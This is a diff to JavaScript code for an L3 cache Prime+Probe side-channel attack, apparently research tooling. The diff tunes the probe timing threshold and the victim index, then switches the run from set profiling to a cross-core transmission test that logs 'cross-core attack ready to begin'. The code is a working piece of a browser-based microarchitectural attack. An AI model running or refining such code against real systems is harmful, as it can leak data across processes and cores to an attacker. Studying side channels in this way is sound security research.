@@ -308,7 +308,7 @@ class EvictionListL3 {
 
     probe(){
         let element = this.head;
-        let THRESHOLD = 50;
+        let THRESHOLD = 60;
         let ret = 0;
         while (element !== END_MARKER) {
             /* use Atomics.load to prevent zeroing out */
@@ -453,7 +453,7 @@ async function l3pp_main(options){
     let evset = new EvictionListL3(buffer, sets[0]); 
 
     let TRIALS = 250, WARMUP_ROUNDS = 100, THRESHOLD = 60;
-    let VICTIM = 8128;
+    let VICTIM = 8192;
 
     ipdft_out = intra_process_detection_fp_test(evset, buffer, WARMUP_ROUNDS, TRIALS, VICTIM);
     log("detection-rate: " + ipdft_out[0]);
@@ -463,8 +463,10 @@ async function l3pp_main(options){
     let TRANSMIT_ROUNDS_SIDE = 256
     intra_process_transmission_test(evset, buffer, WARMUP_ROUNDS, TRANSMIT_ROUNDS_SIDE, VICTIM);
 
-    remote_set_profiling(evset);
-
+    // remote_set_profiling(evset);
+    log("cross-core attack ready to begin");
+    await sleep(3000);
+    cross_core_test(evset, 128); 
     await stopTimer();
 }
 
@@ -472,13 +474,13 @@ function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-function cross_core_test(evset){
+function cross_core_test(evset, rounds){
     transmit_str = "";
-    for(let i  = 0; i < 10; i++){
+    for(let i  = 0; i < 20; i++){
         evset.probe();
     }
-    for(let i = 0; i < TRANSMIT_ROUNDS_SIDE; i++){
-        for(let j = 0; j < TRANSMIT_ROUNDS_SIDE; j++){
+    for(let i = 0; i < rounds; i++){
+        for(let j = 0; j < rounds; j++){
             // TODO: Test wait state
             let result = evset.probe();
             transmit_str += result + " ";
